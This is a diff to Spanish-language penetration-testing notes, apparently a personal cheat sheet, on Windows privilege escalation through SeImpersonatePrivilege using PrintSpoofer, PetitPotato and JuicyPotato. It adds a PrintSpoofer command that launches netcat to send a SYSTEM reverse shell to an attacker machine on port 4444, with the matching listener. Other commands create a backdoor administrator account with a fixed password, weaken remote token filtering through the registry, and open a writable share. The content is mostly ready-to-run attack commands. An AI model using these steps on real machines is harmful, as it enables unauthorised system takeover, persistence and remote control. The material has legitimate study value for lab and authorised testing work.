@@ -4,6 +4,7 @@ Tags: #AD #Windows #SeImpersonatePrivilege #SeAssignPrimaryTokenPrivilege
 
 * [Escalacion-Privilegios-Payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 * [Abusando de Tokens Windows - Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)
+* [PrintSpoofer.exe](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)
 
 ## Tokens de acceso 
 
@@ -116,15 +117,27 @@ Notas:
 ```powershell
 2. 'SetImpersonatePrivilege' = Si un usuario tiene el privilegio antes mencionado se puede aprovechar para obtener acceso a nivel de SYSTEM
 
+❯ .\PrintSpoofer64.exe -c "cmd /c C:\tmp\nc.exe IP_Kali 4444 -e cmd"
+# Ejecutar un comando como nt authority \system para hacer una Reverse shell 
+
+❯ rlwrap nc -nlvp 4444
+# Obtener una shell como nt authority \system en kali
+
+NOTA:
+	- Subir a la máquina víctima el netcat 
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+2. 'SetImpersonatePrivilege' = Si un usuario tiene el privilegio antes mencionado se puede aprovechar para obtener acceso a nivel de SYSTEM
+
 PASOS con 'PetitPotato' para crear un usuario y tener persistencia:
 # Descargar el archivo y transferirlo a la máquina Windows comprometida 
 ❯ https://github.com/wh0amitz/PetitPotato/releases/tag/v1.0.0
-❯ .\PetitPotato.exe 3 cmd     # Ejecutar en Windows y crear una cmd con el usuario 'NT Authority\System' 
-	# EfsID = '3' es el numero de API a usar
-❯ .\PetitPotato.exe 3 "whoami"    # Ejecutar un comando  
-❯ .\PetitPotato.exe 3 "net user omar P4ssw0rd /add"               # Crear un user siendo 'NT Authority\System'
-❯ .\PetitPotato.exe 3 "net localgroup Administrators omar /add"   # Agregar el usuario al grupo 'Administrators'
-❯ .\PetitPotato.exe 3 "net user Omar"                             # Mirar el grupo de un usuario en especifico
+❯ .\PetitPotato.exe 3 "cmd /c whoami"    
+# Ejecutar en Windows y crear una cmd con el usuario 'NT Authority\System'
+# EfsID = '3' es el numero de API a usar  
+❯ .\PetitPotato.exe 3 "cmd /c net user omar P4ssw0rd /add"               # Crear un user siendo 'NT Authority\System'
+❯ .\PetitPotato.exe 3 "cmd /c net localgroup Administrators omar /add"   # Agregar el usuario al grupo 'Administrators'
+❯ .\PetitPotato.exe 3 "cmd /c net user Omar"                             # Mirar el grupo de un usuario en especifico
 
 
 Notas:
@@ -144,6 +157,7 @@ PASOS con 'JuicyPotato' para crear un usuario y tener persistencia:
 	# a = Argumento
 	# l = Puerto de escucha COM 
 ❯ JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators omar /add" -l 1337
+
 ❯ .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
 # Opcional en caso de que no deje ingresar y necesite el recurso compartido
 ❯ .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL" -l 1337  
